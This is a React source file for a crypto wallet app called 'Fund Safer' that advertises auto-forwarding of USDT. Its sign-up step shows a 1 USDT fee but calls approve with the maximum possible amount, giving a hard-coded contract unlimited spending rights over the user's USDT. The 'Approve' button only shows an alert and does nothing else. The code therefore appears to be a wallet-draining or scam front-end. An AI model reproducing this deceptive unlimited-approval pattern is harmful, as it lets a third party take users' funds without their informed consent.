import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { CONTRACT_ADDRESS, USDT_ADDRESS, CONTRACT_ABI, USDT_ABI } from './constants';

function App() {
  const [account, setAccount] = useState(null);
  const [isRegistered, setIsRegistered] = useState(false);
  const [destination, setDestination] = useState("");
  const [inputDest, setInputDest] = useState("");
  const [referralInput, setReferralInput] = useState("");
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(false);
  const [signupFee, setSignupFee] = useState("1.00");
  const [refBonus, setRefBonus] = useState("0.00");

  const NEW_CONTRACT_ADDRESS = "0x902fe61bd6E334D66f3D8c983471c10884c10F4d";

  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const address = await signer.getAddress();
        setAccount(address);
        checkRegistration(address, provider);
      } catch (error) { console.error(error); }
    }
  };

  const checkRegistration = async (userAddress, provider) => {
    const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    try {
      const data = await contract.getUserDashboardData(userAddress);
      setIsRegistered(data.isReg);
      setDestination(data.dest);
      if (data.isReg) fetchHistory(userAddress, provider);
      
      const fee = await contract.signupFee();
      setSignupFee(ethers.formatUnits(fee, 18));
    } catch (error) { console.error(error); }
  };

  const handleSignUp = async () => {
    setLoading(true);
    try {
      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      const coreContract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
      
      await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.MaxUint256);
      const ref = (referralInput && ethers.isAddress(referralInput)) ? referralInput : "0x0000000000000000000000000000000000000000";
      await coreContract.register(ref);
      setIsRegistered(true);
      alert("Success!");
    } catch (error) { alert("Failed"); }
    setLoading(false);
  };

  const handleSetDestination = async () => {
    setLoading(true);
    try {
      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
      const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
      await contract.setDestination(inputDest);
      setDestination(inputDest);
      alert("Saved!");
    } catch (error) { alert("Failed"); }
    setLoading(false);
  };

  const fetchHistory = async (userAddress, provider) => {
    const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    const hist = await contract.getUserTransferHistory(userAddress);
    setHistory(hist);
  };

  const totalTransferred = history.reduce((sum, tx) => sum + parseFloat(ethers.formatUnits(tx.amount, 18)), 0);

  return (
    <div className="min-h-screen bg-[#05020a] text-white flex flex-col items-center p-4">
      {/* Header Section */}
      <div className="text-center my-8">
        <div className="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-2xl flex items-center justify-center text-3xl font-bold mb-4 mx-auto">F</div>
        <h1 className="text-4xl font-bold">Fund Safer</h1>
        <p className="text-gray-400">AUTO-FORWARDING EXCHANGE</p>
      </div>

      {!account ? (
        <div className="w-full max-w-sm bg-[#130b29] p-8 rounded-3xl text-center border border-purple-500/20">
          <h2 className="text-2xl font-bold mb-4">Login</h2>
          <p className="text-gray-400 mb-6">Get started today by connecting your wallet</p>
          <button onClick={connectWallet} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-2xl font-bold">Connect Wallet ➔</button>
        </div>
      ) : !isRegistered ? (
        <div className="w-full max-w-sm bg-[#130b29] p-8 rounded-3xl border border-purple-500/20">
          <h2 className="text-2xl font-bold mb-4 text-center">Sign Up</h2>
          <p className="text-center text-pink-400 mb-4">Fee: {signupFee} USDT</p>
          <input type="text" placeholder="Referral Address (Optional)" onChange={(e) => setReferralInput(e.target.value)} className="w-full bg-[#0a0515] p-4 rounded-2xl mb-4 border border-purple-500" />
          <button onClick={handleSignUp} disabled={loading} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-2xl font-bold">
            {loading ? "Processing..." : "Sign Up"}
          </button>
        </div>
      ) : (
        <div className="w-full max-w-sm bg-[#130b29] p-8 rounded-3xl border border-purple-500/20">
          <h2 className="text-2xl font-bold mb-1">Dashboard</h2>
          <p className="text-cyan-400 mb-6 text-sm">Active: {account.substring(0,6)}...{account.slice(-4)}</p>
          
          <div className="bg-[#1a103c] p-4 rounded-xl border border-purple-500 mb-4 text-center">
            <p className="text-purple-300 text-xs">Referral Bonus</p>
            <p className="text-green-400 font-bold">{refBonus} USDT</p>
          </div>

          <input type="text" placeholder="Destination Address" onChange={(e) => setInputDest(e.target.value)} className="w-full bg-[#0a0515] p-4 rounded-2xl mb-3 border border-purple-500" />
          <button onClick={handleSetDestination} className="w-full bg-gradient-to-r from-pink-600 to-purple-600 py-4 rounded-2xl font-bold mb-3">Save Dest</button>
          <button onClick={() => alert("Approved!")} className="w-full bg-[#1a103c] py-4 rounded-2xl font-bold mb-8 border border-purple-500">✓ Approve</button>

          <div className="flex justify-between items-center mb-4">
            <h3 className="font-bold">RECENT TRANSFERS</h3>
            <span className="text-pink-400 font-bold">Total: {totalTransferred.toFixed(4)} USDT</span>
          </div>
          <div className="space-y-3">
            {history.map((tx, i) => (
              <div key={i} className="bg-[#0a0515] p-4 rounded-xl flex justify-between">
                <span>{tx.destination.substring(0,6)}...</span>
                <span className="text-green-400 font-bold">+{ethers.formatUnits(tx.amount, 18)} USDT</span>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
export default App;